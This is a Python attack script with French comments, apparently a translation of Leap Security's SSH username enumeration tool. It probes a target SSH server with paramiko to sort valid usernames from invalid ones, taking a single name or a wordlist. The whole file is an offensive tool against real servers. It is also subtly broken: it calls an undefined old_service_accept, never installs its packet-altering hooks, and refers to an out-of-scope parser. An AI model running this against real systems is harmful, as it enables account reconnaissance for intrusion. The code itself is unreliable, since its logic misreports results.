#!/usr/bin/env python3

import argparse
import logging
import paramiko
import socket
import sys
import os


class InvalidUsername(Exception):
    pass


# Fonction malveillante pour altérer le paquet
def add_boolean(*args, **kwargs):
    pass


# Fonction qui sera remplacée pour altérer le paquet
def malicious_service_accept(*args, **kwargs):
    old_add_boolean = paramiko.message.Message.add_boolean
    paramiko.message.Message.add_boolean = add_boolean
    result = old_service_accept(*args, **kwargs)
    paramiko.message.Message.add_boolean = old_add_boolean
    return result


# Fonction appelée en cas de nom d'utilisateur invalide
def invalid_username(*args, **kwargs):
    raise InvalidUsername()


def check_user(username, target, port):
    try:
        sock = socket.socket()
        sock.connect((target, int(port)))
        transport = paramiko.transport.Transport(sock)
        transport.start_client(timeout=0.5)

    except paramiko.ssh_exception.SSHException:
        print('[!] Échec de la négociation du transport SSH')
        sys.exit(2)

    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
    except paramiko.ssh_exception.AuthenticationException:
        print("[+] {} est un nom d'utilisateur valide".format(username))
        return True
    except:
        print("[-] {} est un nom d'utilisateur invalide".format(username))
        return False


def check_userlist(wordlist_path, target, port):
    if os.path.isfile(wordlist_path):
        valid_users = []
        with open(wordlist_path) as f:
            for line in f:
                username = line.rstrip()
                try:
                    if check_user(username, target, port):
                        valid_users.append(username)
                except KeyboardInterrupt:
                    print("Énumération interrompue par l'utilisateur !")
                    break

        print_result(valid_users)
    else:
        print("[-] {} n'est pas un fichier de wordlist valide".format(wordlist_path))
        sys.exit(2)


def print_result(valid_users):
    if valid_users:
        print("Utilisateurs valides :")
        for user in valid_users:
            print(user)
    else:
        print("Aucun utilisateur valide détecté.")


def setup_logging():
    # Supprime les journaux de paramiko
    logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())


def parse_arguments():
    parser = argparse.ArgumentParser(description='SSH User Enumeration by Leap Security (@LeapSecurity)')
    parser.add_argument('target', help="Adresse IP du système cible")
    parser.add_argument('-p', '--port', default=22, help="Définit le port du service SSH")
    parser.add_argument('-u', '--user', dest='username', help="Nom d'utilisateur à vérifier")
    parser.add_argument('-w', '--wordlist', dest='wordlist', help="Wordlist de noms d'utilisateurs")
    return parser.parse_args()


def main():
    setup_logging()
    args = parse_arguments()

    if args.wordlist:
        check_userlist(args.wordlist, args.target, args.port)
    elif args.username:
        check_user(args.username, args.target, args.port)
    else:
        print("[-] Vous devez spécifier un nom d'utilisateur ou une wordlist !\n")
        parser.print_help()
        sys.exit(1)


if __name__ == "__main__":
    main()
